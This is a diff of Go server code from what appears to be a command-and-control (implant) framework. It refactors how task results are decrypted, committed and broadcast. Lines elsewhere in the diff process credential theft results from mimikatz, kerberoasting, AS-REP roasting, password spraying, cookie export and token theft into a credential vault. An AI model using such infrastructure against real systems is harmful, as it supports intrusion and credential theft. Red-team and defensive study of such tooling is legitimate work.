@@ -487,24 +487,38 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			slog.Debug("Duplicate task result dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type, "rid", r.ResultID)
 			continue
 		}
-		// Per-task key decryption (P2): if the agent sealed this result with the
-		// task-issued AES-256-GCM key, recover the plaintext before further
-		// processing. Failure leaves the ciphertext in place and is logged.
+		// Per-task decryption fails closed: ciphertext and plaintext fallbacks
+		// are never persisted or broadcast as a successful task result.
 		if r.EncryptedWithTaskKey {
-			if t, ok := taskMap[r.TaskID]; ok && t.TaskKey != "" {
-				if plain, err := decryptTaskKeyOutput(t.TaskKey, r.Output); err == nil {
-					r.Output = plain
-					r.EncryptedWithTaskKey = false
-				} else {
-					slog.Warn("Per-task key decryption failed", "agent_id", uuid, "task_id", r.TaskID, "err", err)
-				}
-			} else {
-				slog.Warn("Per-task key result with no stored key", "agent_id", uuid, "task_id", r.TaskID)
+			key := ""
+			if t, ok := taskMap[r.TaskID]; ok {
+				key = t.TaskKey
+			}
+			if err := decryptTaskResultKey(key, &r); err != nil {
+				slog.Warn("Per-task key decryption failed", "agent_id", uuid, "task_id", r.TaskID, "err", err)
 			}
 		}
 		if r.Type == "screen_frame" && r.Output != "" {
 			if s.IsScreenMonitoring(uuid) {
 				s.BroadcastScreenshot(uuid, r.Output)
+			}
+			continue
+		}
+		if r.Type == protocol.TaskTypeShellOutput {
+			shellID := strings.TrimSpace(r.Path)
+			if shellID == "" || r.Output == "" {
+				continue
+			}
+			s.broadcastShellOutput(uuid, shellID, r.Output, r.Encoding)
+			if s.eventManager != nil {
+				s.eventManager.Emit(Event{
+					Type: EventShellOutput, AgentID: uuid, AgentHost: agent.Hostname,
+					AgentIP: agent.IP, AgentOS: agent.OS, TenantID: agent.TenantID,
+					Timestamp: now,
+					Data: map[string]interface{}{
+						"shell_id": shellID, "data": r.Output, "encoding": r.Encoding,
+					},
+				})
 			}
 			continue
 		}
@@ -582,11 +596,19 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			// base64 in the console, with multibyte UTF-8 mangled at the cap.
 			appendTaskResultTail(task, decodeTaskResult(r.Type, r.Encoding, r.Output))
 			task.UpdatedAt = now
-			if uerr := s.withBusyRetryDB("result", func() *gorm.DB {
-				return s.db.Model(&db.Task{}).Where("id = ?", task.ID).
-					Updates(map[string]interface{}{"result": task.Result, "updated_at": now})
-			}).Error; uerr != nil {
-				slog.Error("Failed to persist partial task output", "agent_id", uuid, "task_id", r.TaskID, "error", uerr)
+			partial := s.withBusyRetryDB("result", func() *gorm.DB {
+				return s.db.Model(&db.Task{}).
+					Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).
+					Updates(map[string]interface{}{
+						"result": task.Result, "acknowledged_at": task.AcknowledgedAt, "updated_at": now,
+					})
+			})
+			if partial.Error != nil {
+				slog.Error("Failed to persist partial task output", "agent_id", uuid, "task_id", r.TaskID, "error", partial.Error)
+				continue
+			}
+			if partial.RowsAffected == 0 {
+				continue
 			}
 			s.broadcastTaskUpdate(uuid, *task)
 			continue
@@ -672,36 +694,13 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			task.Result, fileChunkErr = s.persistFileChunk(uuid, task, r, "download", "Download chunk saved")
 		}
 
-		// Atomic first-final-wins claim: chunked transfers (upload/download)
-		// deliver many final-shaped results per task ID. Without this guard
-		// every chunk re-finalised the task and drained another pending-slot
-		// from agentPendingTasks, zeroing MaxPendingTasksPerAgent and letting
-		// that agent bypass the anti-flood gate entirely.
+		// Compute the final state now, but do not claim it until the complete
+		// encrypted result row can be written. Chunked transfers may deliver
+		// many final-shaped results; the conditional commit remains the single
+		// first-final-wins guard and owns the pending-slot release.
 		finalStatus := "completed"
 		if r.Error != "" || fileChunkErr != nil {
 			finalStatus = "failed"
-		}
-		claim := s.withBusyRetryDB("result", func() *gorm.DB {
-			return s.db.Model(&db.Task{}).
-				Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).
-				Update("status", finalStatus)
-		})
-		if claim.Error != nil {
-			slog.Error("Failed to claim task finality", "agent_id", uuid, "task_id", r.TaskID, "error", claim.Error)
-			continue
-		}
-		if claim.RowsAffected == 0 {
-			// Already terminal (duplicate/replayed result): drop silently.
-			slog.Debug("Duplicate terminal result dropped (finality claim)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
-			continue
-		}
-		task.Status = finalStatus
-		// Vault-backed work writes exactly one ledger row, even when the
-		// agent re-sends the result with a fresh result id.
-		if task.CredentialID != nil {
-			if action, result := credentialUsageForResult(task.Type, r.Error, r.Output); action != "" {
-				_ = s.recordCredentialUsageOnce(*task, action, result, "")
-			}
 		}
 		if r.SHA256 != "" {
 			task.ResultSHA256 = r.SHA256
@@ -717,32 +716,11 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		}
 		task.UpdatedAt = now
 
-		// Decrement per-agent pending task counter (delete key at zero to avoid leak) —
-		// reached exactly once per task thanks to the claim above.
-		s.decrementPendingTasks(uuid)
-		if s.metrics != nil {
-			s.metrics.TaskExecuteDuration.WithLabelValues(task.Type).Observe(now.Sub(task.CreatedAt).Seconds())
-		}
-		// Keep a failed chunk's poisoned chain state: resetting it here would
-		// let a replay of the rejected chunk pass the zero-prev check.
-		if fileChunkErr == nil {
-			s.fileChains.reset(task.ID)
-		}
 		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
 			task.Result = "processed"
-			s.broadcastTaskUpdate(uuid, *task)
-			if r.Type == "screen_stream_start" && task.Status == "failed" {
-				s.BroadcastScreenMonitorError(uuid, task.Error)
-			}
-			if err := s.withBusyRetryDB("result", func() *gorm.DB {
-				return s.db.Save(task)
-			}).Error; err != nil {
-				slog.Error("Failed to save screen control task", "task_id", task.ID, "error", err)
-			}
-			continue
 		}
 
-		// Silent task types: save result for polling but skip WebSocket broadcast
+		// Silent task types: save result for polling but skip WebSocket broadcast.
 		isSilent := r.Type == "ls"
 
 		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output != "" {
@@ -754,13 +732,10 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			if err := s.saveScreenshot(s.rawDataDir(), uuid, task.ID, r.Output); err != nil {
 				// The capture exists only if it reached the disk; a failed write
 				// is a failed task, not a completed task with an empty gallery.
-				task.Status = "failed"
+				finalStatus = "failed"
 				task.Error = "screenshot could not be saved"
 				task.Result = ""
 				slog.Error("Failed to persist screenshot result", "agent_id", uuid, "task_id", task.ID, "error", err)
-			}
-			if s.IsScreenMonitoring(uuid) {
-				s.BroadcastScreenshot(uuid, r.Output)
 			}
 		} else if r.Type == "file_thumb" && r.Output != "" {
 			// Thumbnail bytes are written to data/thumbs and replaced with an
@@ -787,108 +762,6 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			task.Result = formatPrivescStructuredResult(task.Result)
 		}
 
-		// When set_sleep succeeds, update agent's current interval/jitter
-		if r.Type == "set_sleep" && task.Status == "completed" {
-			parts := strings.Split(task.Command, ",")
-			sleepUpdates := map[string]interface{}{}
-			if len(parts) >= 1 {
-				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && v >= 1 && v <= 86400 {
-					sleepUpdates["current_interval"] = v
-				}
-			}
-			if len(parts) >= 2 {
-				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil && v >= 0 && v <= 100 {
-					sleepUpdates["current_jitter"] = v
-				}
-			}
-			if len(sleepUpdates) > 0 {
-				if err := s.withBusyRetryDB("result", func() *gorm.DB {
-					return s.db.Model(&db.Implant{}).Where("id = ?", uuid).Updates(sleepUpdates)
-				}).Error; err != nil {
-					slog.Error("Failed to update sleep settings on agent", "agent_id", uuid, "error", err)
-				} else {
-					s.broadcastAgentDataUpdate(uuid, sleepUpdates)
-					// The operator-visible sleep values are part of the delivered
-					// network config; refresh on this agent's next beacon.
-					s.markNetworkConfigChanged()
-				}
-			}
-		}
-
-		// Auto-parse credential dump results into the vault
-		if r.Type == "creds" && task.Status == "completed" && task.Result != "" {
-			s.parseAndStoreCredentials(uuid, task.Result, task.ID)
-			s.eventManager.Emit(Event{
-				Type:      EventCredentialFound,
-				AgentID:   uuid,
-				AgentHost: agent.Hostname,
-				AgentIP:   agent.IP,
-				Timestamp: now,
-				Data:      map[string]interface{}{"source": "creds_dump"},
-			})
-		}
-
-		// Auto-parse mimikatz results into the credential vault
-		if r.Type == "mimikatz" && task.Status == "completed" && task.Result != "" {
-			s.parseAndStoreCredentials(uuid, task.Result, task.ID)
-			s.eventManager.Emit(Event{
-				Type:      EventCredentialFound,
-				AgentID:   uuid,
-				AgentHost: agent.Hostname,
-				AgentIP:   agent.IP,
-				Timestamp: now,
-				Data:      map[string]interface{}{"source": "mimikatz"},
-			})
-		}
-
-		// Auto-parse kerberoast TGS hashes into the credential vault
-		if r.Type == "kerberoast" && task.Status == "completed" && task.Result != "" {
-			s.parseAndStoreKerberoastResults(uuid, task.Result, task.ID)
-			s.eventManager.Emit(Event{
-				Type:      EventCredentialFound,
-				AgentID:   uuid,
-				AgentHost: agent.Hostname,
-				AgentIP:   agent.IP,
-				Timestamp: now,
-				Data:      map[string]interface{}{"source": "kerberoast"},
-			})
-		}
-
-		// Auto-parse asreproast hashes into the credential vault
-		if r.Type == "asreproast" && task.Status == "completed" && task.Result != "" {
-			s.parseAndStoreASREPRoastResults(uuid, task.Result, task.ID)
-			s.eventManager.Emit(Event{
-				Type:      EventCredentialFound,
-				AgentID:   uuid,
-				AgentHost: agent.Hostname,
-				AgentIP:   agent.IP,
-				Timestamp: now,
-				Data:      map[string]interface{}{"source": "asreproast"},
-			})
-		}
-
-		// Auto-ingest valid password spray hits into the credential vault
-		if r.Type == "password_spray" && task.Status == "completed" && task.Result != "" {
-			if stored := s.parseAndStorePasswordSprayResults(uuid, *task, task.Result); stored > 0 {
-				s.eventManager.Emit(Event{
-					Type:      EventCredentialFound,
-					AgentID:   uuid,
-					AgentHost: agent.Hostname,
-					AgentIP:   agent.IP,
-					Timestamp: now,
-					Data:      map[string]interface{}{"source": "password_spray", "count": stored},
-				})
-			}
-		}
-
-		// Confirm matching vault entries on successful credential checks
-		if r.Type == "cred_check" && task.Status == "completed" && task.Result != "" {
-			s.parseAndStoreCredCheckResult(uuid, *task, task.Result)
-		}
-
-		if r.Type == "cookie_export" && task.Status == "completed" && task.Result != "" {
-			s.ingestCookieExport(uuid, task.Result)
-		}
 
 		// Result size cap is enforced before parsing (see above); screenshots
 		// are exempt from the cap.
@@ -899,104 +772,34 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			task.LastResultID = r.ResultID
 		}
 		dbTask := *task
+		dbTask.Status = finalStatus
 		if err := s.encryptTaskFieldsOrBlank(&dbTask); err != nil {
 			// The agent executed fine but the vault is broken: fail loudly
-			// (alerts fire) rather than storing the output as plaintext.
-			task.Status = "failed"
+			// and persist the fail-closed marker, never plaintext output.
+			finalStatus = "failed"
+			dbTask.Status = finalStatus
+			task.Result = ""
+			task.Error = dbTask.Error
 		}
-		if err := s.withBusyRetryDB("result", func() *gorm.DB {
-			return s.db.Model(&db.Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
-				"status":          task.Status,
-				"result":          dbTask.Result,
-				"error":           dbTask.Error,
-				"progress":        task.Progress,
-				"total_bytes":     task.TotalBytes,
-				"transferred":     task.Transferred,
-				"last_result_id":  task.LastResultID,
-				"result_sha256":   task.ResultSHA256,
-				"result_mod_time": task.ResultModTime,
-			})
-		}).Error; err != nil {
+		committed, err := s.commitTaskResult(task, dbTask, now)
+		if err != nil {
 			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
-		} else if task.Status == "completed" && r.Type == task.Type {
-			s.applyStructuredTaskResult(agent, *task, r, now)
+			continue
+		}
+		if !committed {
+			slog.Debug("Duplicate terminal result dropped (finality commit)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
+			continue
+		}
+
+		s.afterTaskResultCommit(agent, task, r, now, fileChunkErr == nil)
+		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output != "" && s.IsScreenMonitoring(uuid) {
+			s.BroadcastScreenshot(uuid, r.Output)
+		}
+		if r.Type == "screen_stream_start" && task.Status == "failed" {
+			s.BroadcastScreenMonitorError(uuid, task.Error)
 		}
 		if !isSilent {
 			s.broadcastTaskUpdate(uuid, *task)
-		}
-		// A read-only enumeration that failed is worth one more ask; anything that changes state is not. The helper owns
-		// that distinction, and swallows its own failures so a retry can never damage the result just stored.
-		if task.Status == "failed" {
-			if retryID, created := s.maybeAutoRetryTask(task.ID, uuid, task.Type, task.Command, task.Shell,
-				task.CreatedBy, task.RetryCount, task.TenantID); created {
-				slog.Info("Automation: re-issued a failed read-only task",
-					"task_id", task.ID, "retry_id", retryID, "type", task.Type)
-			}
-		}
-
-		// Emit task lifecycle events so webhooks, email, automation rules, and
-		// (for failures) the alert/notification pipeline react. Generic results
-		// previously never emitted EventTaskComplete/EventTaskFail, leaving the
-		// subscribers in server.go permanently dormant. Intermediate screenshot
-		// chunks carry no TaskID and never reach this point, so only genuine
-		// task completions fire.
-		evtType := EventTaskComplete
-		if task.Status == "failed" {
-			evtType = EventTaskFail
-		}
-		s.eventManager.Emit(Event{
-			Type:      evtType,
-			AgentID:   uuid,
-			AgentHost: agent.Hostname,
-			AgentIP:   agent.IP,
-			TaskID:    task.ID,
-			Timestamp: now,
-			Data: map[string]interface{}{
-				"type":    r.Type,
-				"status":  task.Status,
-				"command": task.Command,
-			},
-		})
-
-		// Task callbacks: POST results to external URL when task completes.
-		// Bounded pool with shutdown-safe acquire (see runTaskWorker).
-		if task.CallbackURL != "" && !task.CallbackSent {
-			completed := *task
-			s.runTaskWorker("task_callback", func() {
-				s.executeTaskCallback(completed, uuid)
-			})
-		}
-
-		if s.pluginManager != nil {
-			completed := *task
-			s.runTaskWorker("plugin_hook", func() {
-				ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
-				defer cancel()
-				if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
-					Type:      plugin.EventTaskCompleted,
-					Timestamp: now,
-					AgentID:   uuid,
-					Payload: map[string]interface{}{
-						"task_id":   completed.ID,
-						"task_type": completed.Type,
-						"status":    completed.Status,
-						"error":     completed.Error,
-					},
-				}); err != nil {
-					slog.Warn("Hook errors on task_completed event", "agent_id", uuid, "task_id", completed.ID, "err", err)
-				}
-			})
-		}
-
-		// ── Token vault: persist steal/make results ───────────────────────────
-		if r.Error == "" && task.Result != "" {
-			switch r.Type {
-			case "token_steal", "token_make", "token_revert", "rev2self":
-				completed := *task
-				s.runTaskWorker("token_result", func() {
-					s.processTokenResult(uuid, r.Type, completed.Result)
-				})
-			}
 		}
 
 		if (r.Type == "shell" || r.Type == "ps") && (r.Output != "" || r.Error != "" || task.Command != "") {
